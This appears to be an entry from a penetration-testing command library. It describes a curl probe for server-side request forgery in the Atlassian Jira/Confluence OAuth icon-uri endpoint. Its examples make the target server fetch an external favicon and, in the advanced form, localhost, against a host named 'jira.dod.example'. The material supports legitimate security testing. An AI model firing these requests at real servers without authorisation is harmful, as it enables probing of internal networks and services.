---
data: >-
  curl
  "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://example.com/favicon.ico"
  -v
tags:
  - ssrf
  - test
type: command
output: Fetched favicon or snapshot content
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.300Z'
id: e910d680-eeea-4a7a-bb59-f0598fd437d4
verified: false
validated: true
submitted: true
---
# curl-ssrf-test-endpoint

## Command

```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://example.com/favicon.ico" -v
```

## Description

Tests the OAuth endpoint for SSRF by requesting an external favicon; verbose output shows if the server fetches the URL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target-domain` | Jira/Confluence domain | Yes |
| `consumerUri` | Arbitrary URL to fetch | Yes |
| `-v` | Verbose mode | No |

## Examples

### Basic Usage

```bash
curl "https://jira.dod.example/plugins/servlet/oauth/users/icon-uri?consumerUri=http://example.com/favicon.ico"
```

### Advanced Usage

```bash
curl "https://jira.dod.example/plugins/servlet/oauth/users/icon-uri?consumerUri=http://localhost/" -v --max-time 10
```

## Expected Output

HTTP response with body containing the fetched resource or error indicating SSRF success/failure.

## Related

- [[Related Procedure: Exploit-SSRF-in-Atlassian-OAuth-Plugin]]
